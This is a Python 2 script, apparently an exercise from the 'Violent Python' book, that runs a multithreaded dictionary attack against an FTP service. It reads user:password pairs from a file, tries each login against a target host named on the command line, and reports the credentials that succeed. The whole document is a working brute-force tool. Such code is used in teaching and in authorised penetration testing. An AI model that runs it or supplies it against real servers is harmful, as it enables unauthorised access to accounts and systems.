#!/usr/bin/python
import ftplib
import optparse
import os
from threading import *
maxConnections = 5
connection_lock = BoundedSemaphore(value=maxConnections)

# Violent Python. Chapt2. The Madness goes on !!!
# This time we will dictionary attack an FTP service. Using a dictionary conatining
# the keys in the format user:passwd

def set_found(i):
  # Interface to modify a global variable called Found (in case the priv key was found
  global Found
  if i == 1:
    Found = True
  else:
    Found = False

def set_pfound(val):
  # And a global variable that will hold the name of the private key found (IF)
  global pFound
  pFound = val

def ftp_conn(hostname, up_tupl):
  try:
    # User and password are read in the format user:passwd
    # We will use split to separate one from the other
    user, passwd = up_tupl.split(':')
    ftp = ftplib.FTP(hostname)
    ftp.login(user, passwd)
    print '[+] Successful login to %s as %s:%s' %(hostname, user, passwd)
    set_found(1)
    set_pfound(passwd)
    exit(0)
  except Exception as e:
    print '[-] Failed %s -> %s:%s . %s' %(hostname, user, passwd, e)
    return False
  finally:
    ftp.quit()
    connection_lock.release()

def ret_lines(filename):
  # Function that reads a file and returns its content as a list, each element being a line 
  # It also performs validations (File must exist and user mut have read access to it)
  if not os.path.isfile(filename):
    print '[-] %s doesn\'t exist' %(filename)
    exit(0)
  elif not os.access(filename, os.R_OK):
    print '[-] %s Access Denied' %(filename)
    exit(0)
  f = open(filename, 'r')
  print '[-] Reading file: %s' %(filename)
  lines = f.readlines()
  f.close()
  return lines

def main():
  global Found
  global pFound
  p = optparse.OptionParser('Usage: %prog -H <Host IP> -f <dict file>\n'+\
                             'This script will try to perform an authentication dictionary'+\
			     'attack on the Server using the dictionary file (user:passwd)')
  p.add_option('-H', dest='host', type='string', help='IP Address of target server')
  p.add_option('-f', dest='d_file', type='string', help='Dictionary file')
  (options, args) = p.parse_args()
  host = options.host
  d_file = options.d_file
  if (host == None) or (d_file == None):
    print p.usage
    exit(0)
  us_pass = ret_lines(d_file)
  set_found(0)
  for up_tupl in us_pass:
    if Found == True:
      # Unless the Found variable has been set to True. In wich case:
      # We will print the value of the recovered passwd and exit
      print '\n  [*] Password found: %s\n\n' %(pFound)
      exit(0)
    up_tupl = up_tupl.strip('\n')
    connection_lock.acquire()
    t = Thread(target=ftp_conn, args=(host, up_tupl))
    t.start()

if __name__ == '__main__':
  main()

